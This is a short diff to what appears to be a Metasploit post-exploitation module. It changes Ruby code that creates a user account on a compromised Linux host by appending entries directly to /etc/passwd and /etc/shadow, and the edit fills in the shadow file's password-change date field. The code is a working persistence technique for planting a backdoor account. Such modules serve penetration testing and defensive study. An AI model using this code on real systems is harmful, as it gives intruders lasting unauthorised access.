@@ -212,7 +212,7 @@ class MetasploitModule < Msf::Post
       home = datastore['HOME'].empty? ? "/home/#{datastore['USERNAME']}" : datastore['HOME']
       uid = rand(1000..2000).to_s
       vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:x:#{uid}:#{uid}::#{home}:#{datastore['SHELL']}\' >> /etc/passwd"))
-      vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}::0:99999:7:::\' >> /etc/shadow")) # TODO: Finalize this line
+      vprint_status(cmd_exec("echo \'#{datastore['USERNAME']}:#{passwd}:#{Time.now.to_i / 86400}:0:99999:7:::\' >> /etc/shadow"))
       group_file_save = group_file
 
       groups.select do |group|
